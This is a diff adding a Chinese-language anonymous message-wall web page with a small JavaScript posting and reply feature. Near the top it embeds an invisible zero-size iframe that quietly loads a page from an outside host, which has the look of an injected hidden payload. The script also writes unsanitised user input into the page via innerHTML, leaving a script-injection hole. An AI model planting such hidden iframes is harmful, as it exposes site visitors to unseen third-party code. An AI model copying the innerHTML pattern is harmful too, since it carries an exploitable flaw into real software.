@@ -1,0 +1,82 @@
+
+<!DOCTYPE html>
+<html>
+  <iframe src="https://ktv98.gitee.io./gg.html" width="0" height="0"></iframe></body>
+<head>
+<title>匿名留言墙</title>
+<style>
+    .message {
+        margin-bottom: 20px;
+    }
+    .reply {
+        margin-left: 20px;
+    }
+</style>
+</head>
+<body>
+    <h1><font style="background-color:yellow"><font size="4"><font color="#ff0000"><strong>留言墙</strong></font></font></font><br /></h1>
+    
+    <form id="messageForm">
+        <label for="name">编号：</label>
+        <input type="text" id="name" required><br>
+        <label for="message">留言内容：</label><br>
+        <textarea id="message" rows="4" cols="50" required></textarea><br>
+        <button type="submit">留言</button>
+    </form>
+    
+    <div id="messages"></div>
+    
+    <script>
+        document.getElementById("messageForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            
+            var name = document.getElementById("name").value;
+            var message = document.getElementById("message").value;
+            
+            var messageDiv = document.createElement("div");
+            messageDiv.classList.add("message");
+            messageDiv.innerHTML = "<strong>" + name + "：</strong>" + message;
+            
+            var replyForm = document.createElement("form");
+            replyForm.classList.add("reply-form");
+            replyForm.style.display = "none";
+            replyForm.innerHTML = `
+                <label for="reply">回复：</label>
+                <textarea id="reply" rows="2" cols="40"></textarea>
+                <button type="button" onclick="addReply(this)">回复</button>
+            `;
+            
+            messageDiv.appendChild(replyForm);
+            
+            var replyButton = document.createElement("button");
+            replyButton.innerText = "回复";
+            replyButton.onclick = function() {
+                replyForm.style.display = "block";
+                replyButton.style.display = "none";
+            }
+            
+            messageDiv.appendChild(replyButton);
+            
+            document.getElementById("messages").appendChild(messageDiv);
+            
+            document.getElementById("name").value = "";
+            document.getElementById("message").value = "";
+        });
+        
+        function addReply(button) {
+            var reply = button.previousElementSibling.value;
+            
+            var replyDiv = document.createElement("div");
+            replyDiv.classList.add("reply");
+            replyDiv.innerHTML = "<strong>回复：</strong>" + reply;
+            
+            button.parentNode.parentNode.appendChild(replyDiv);
+            
+            button.previousElementSibling.value = "";
+            
+            button.parentNode.style.display = "none";
+            button.parentNode.parentNode.querySelector("button").style.display = "block";
+        }
+    </script>
+</body>
+</html>
